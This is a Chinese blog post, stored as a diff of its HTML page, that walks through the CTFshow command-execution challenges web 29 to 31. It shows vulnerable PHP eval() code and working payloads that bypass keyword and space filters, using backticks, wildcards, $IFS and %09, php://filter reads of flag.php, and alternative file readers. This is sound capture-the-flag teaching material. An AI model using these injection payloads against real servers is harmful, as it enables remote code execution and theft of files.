@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CTFshow web 命令执行 | 惜缘怀古的博客</title><meta name="keywords" content="惜缘怀古，博客"><meta name="author" content="惜缘怀古"><meta name="copyright" content="惜缘怀古"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web 29123456789101112131415 &lt;?php error_reporting(0);if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    $c &#x3D; $_GET[&amp;#x27;c&amp;#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&amp;#123;        eval($c);   &#x2F;&#x2F;eval(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow web 命令执行">
+<meta property="og:url" content="https://xiyuanhuaigu.gitee.io/2022/07/08/CTFshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="惜缘怀古的博客">
+<meta property="og:description" content="web 29123456789101112131415 &lt;?php error_reporting(0);if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    $c &#x3D; $_GET[&amp;#x27;c&amp;#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&amp;#123;        eval($c);   &#x2F;&#x2F;eval(">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/minglingzhixing.jpg">
+<meta property="article:published_time" content="2022-07-08T09:02:29.000Z">
+<meta property="article:modified_time" content="2022-07-08T14:04:19.451Z">
+<meta property="article:author" content="惜缘怀古">
+<meta property="article:tag" content="惜缘怀古，博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/minglingzhixing.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xiyuanhuaigu.gitee.io/2022/07/08/CTFshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTFshow web 命令执行',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-07-08 22:04:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/minglingzhixing.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">惜缘怀古的博客</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTFshow web 命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-08T09:02:29.000Z" title="发表于 2022-07-08 17:02:29">2022-07-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-08T14:04:19.451Z" title="更新于 2022-07-08 22:04:19">2022-07-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTFshow web 命令执行"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);   <span class="comment">//eval() 函数把字符串按照 PHP 代码来计算。</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h2 id="一-分析代码："><a href="#一-分析代码：" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><code>  if(!preg_match(&quot;/flag/i&quot;, $c))</code></p>
+<p>preg_match 函数用于执行一个正则表达式。/i意味着不区分大小写。这句话的含义是不能使用flag而且忽略了大小写，这句话过滤了flag</p>
+<h2 id="二-解题过程："><a href="#二-解题过程：" class="headerlink" title="二.解题过程："></a>二.解题过程：</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>传入</p>
+<p><code> ?c=echo &quot;a&quot;?&gt;&lt;?php system(&quot;ls&quot;);</code></p>
+<p>可以发现有flag.php,结合伪协议可以将flag.php的内容给读出来</p>
+<p><code> ?c=echo &#39;a &#39;?&gt;&lt;?php include&quot;$_GET[url]&quot;;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>1.首先查看一下php的版本，访问一下是7</p>
+<p><code> ?c=phpinfo();</code></p>
+<p>2.接下来查看一下发现没有禁用函数</p>
+<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-08174928.png"></p>
+<p>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。（eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。）</p>
+<p>3.列出当前目录的所有内容</p>
+<p><code> ?c=print_r(scandir(&quot;./&quot;));</code></p>
+<p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-08175421.png"></p>
+<p>4.经过一系列的尝试发现可以采用写入文件的方法</p>
+<p><code> ?c=system(“cat *php &gt;&gt;1.txt”);  *php是后缀为php，本句的意思是将后缀为php的写入2.txt中</code></p>
+<p>5.之后访问/1.txt,即可得到flag</p>
+<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>涉及的知识点是<strong>通用符</strong><br>我们想要执行 cat flag.php，但是flag被过滤了,这时候就可以使用通配符<br>cat f*表示打开当前目录下所有 f开头的文件</p>
+<p><code> ?c=echo system(&#39;cat f*&#39;);</code></p>
+<h1 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h2 id="一-分析代码：-1"><a href="#一-分析代码：-1" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><code> if(!preg_match(&quot;/flag|system|php/i&quot;, $c))</code></p>
+<p>过滤了flag，system,php</p>
+<h2 id="二-解题过程：-1"><a href="#二-解题过程：-1" class="headerlink" title="二.解题过程："></a>二.解题过程：</h2><h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p><code>?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>反引号执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo`cat * &gt;&gt; 1.txt`;</span><br></pre></td></tr></table></figure>
+
+<p>访问1.txt，即可得到flag</p>
+<h3 id="方法三：-1"><a href="#方法三：-1" class="headerlink" title="方法三："></a>方法三：</h3><p> 反引号执行系统命令<br> 使用通配符或*绕过过滤flag和php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span> `cat f*`;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h2 id="一-分析代码：-2"><a href="#一-分析代码：-2" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))</span><br></pre></td></tr></table></figure>
+
+<p>过滤了flag,system,php,cat,sort,shell,空格,单引号，. 。</p>
+<h2 id="二-解题思路："><a href="#二-解题思路：" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-2"><a href="#方法一：-2" class="headerlink" title="方法一："></a>方法一：</h3><p>1.涉及的知识点：</p>
+<p><strong>空格过滤</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%09 符号需要php环境</span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
+
+<p><strong>cat过滤</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2.我们可以构造playload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span>(`tac%<span class="number">09</span>f*`);</span><br><span class="line">?c=<span class="keyword">echo</span>(`tail%<span class="number">09</span>f*`);</span><br><span class="line">需要查看源码：</span><br><span class="line">?c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>f*`);</span><br><span class="line">?c=<span class="keyword">echo</span>(`less%<span class="number">09</span>f*`);</span><br><span class="line">?c=<span class="keyword">echo</span>(`more%<span class="number">09</span>f*`);</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p> 采用include结合<a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/82461043">伪协议</a>进行包含读取</p>
+<blockquote>
+<p>?c=include”$_GET[url]”?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">惜缘怀古</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xiyuanhuaigu.gitee.io/2022/07/08/CTFshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://xiyuanhuaigu.gitee.io/2022/07/08/CTFshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xiyuanhuaigu.gitee.io" target="_blank">惜缘怀古的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/minglingzhixing.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/07/06/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/"><img class="next-cover" src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/241a389f507b0b2a6168d74f43c142d3419c8c6c_raw.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctfshow web入门 爆破</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">惜缘怀古</div><div class="author-info__description">唯有那份炫目，未曾忘却</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-29"><span class="toc-number">1.</span> <span class="toc-text">web 29</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">一.分析代码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">二.解题过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">方法二：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">方法三：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-30"><span class="toc-number">2.</span> <span class="toc-text">web 30</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">一.分析代码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">2.2.</span> <span class="toc-text">二.解题过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">方法二：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">方法三：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-31"><span class="toc-number">3.</span> <span class="toc-text">web 31</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%EF%BC%9A-2"><span class="toc-number">3.1.</span> <span class="toc-text">一.分析代码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">二.解题思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A-2"><span class="toc-number">3.2.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.2.2.</span> <span class="toc-text">方法二:</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/07/08/CTFshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow web 命令执行"><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/minglingzhixing.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFshow web 命令执行"/></a><div class="content"><a class="title" href="/2022/07/08/CTFshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow web 命令执行">CTFshow web 命令执行</a><time datetime="2022-07-08T09:02:29.000Z" title="发表于 2022-07-08 17:02:29">2022-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/06/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/" title="ctfshow web入门 爆破"><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/241a389f507b0b2a6168d74f43c142d3419c8c6c_raw.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow web入门 爆破"/></a><div class="content"><a class="title" href="/2022/07/06/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/" title="ctfshow web入门 爆破">ctfshow web入门 爆破</a><time datetime="2022-07-06T11:39:31.000Z" title="发表于 2022-07-06 19:39:31">2022-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/04/CTFshow-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="CTFshow-信息收集"><img src="/img/ctfshowxinxishouji.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFshow-信息收集"/></a><div class="content"><a class="title" href="/2022/07/04/CTFshow-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="CTFshow-信息收集">CTFshow-信息收集</a><time datetime="2022-07-04T07:38:50.000Z" title="发表于 2022-07-04 15:38:50">2022-07-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/03/Meterpreter/" title="Meterpreter"><img src="/img/meta.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Meterpreter"/></a><div class="content"><a class="title" href="/2022/07/03/Meterpreter/" title="Meterpreter">Meterpreter</a><time datetime="2022-07-03T02:54:04.000Z" title="发表于 2022-07-03 10:54:04">2022-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/01/Linux%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="Linux编译环境配置"><img src="/img/linuxbinyi.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux编译环境配置"/></a><div class="content"><a class="title" href="/2022/07/01/Linux%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="Linux编译环境配置">Linux编译环境配置</a><time datetime="2022-07-01T02:30:08.000Z" title="发表于 2022-07-01 10:30:08">2022-07-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 惜缘怀古</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" 